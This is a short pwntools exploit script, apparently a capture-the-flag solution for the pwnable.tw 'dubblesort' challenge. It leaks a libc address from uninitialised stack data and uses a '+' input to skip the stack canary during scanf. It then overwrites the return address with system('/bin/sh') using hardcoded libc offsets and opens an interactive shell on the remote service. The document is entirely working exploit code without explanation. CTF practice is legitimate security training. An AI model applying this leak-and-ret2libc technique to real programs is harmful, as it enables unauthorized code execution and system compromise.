from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
debug = 0
if debug == 1:
    p = process('./dubblesort')
else:
    p = remote("chall.pwnable.tw",10101)

got_off = 0x1b0000
system_off = 0x3a940
bin_sh_off = 0x158e8b
p.recv()
p.sendline('a'*24)
got_addr = u32(p.recv()[30:34])-0xa
libc_addr = got_addr-got_off
system_addr = libc_addr + system_off
bin_sh_addr = libc_addr + bin_sh_off
p.sendline('35')
p.recv()
for i in range(24):
    p.sendline('0')
    p.recv()
p.sendline('+')
p.recv()
for i in range(9):
    p.sendline(str(system_addr))
    p.recv()
p.sendline(str(bin_sh_addr))
p.recv()
p.interactive()
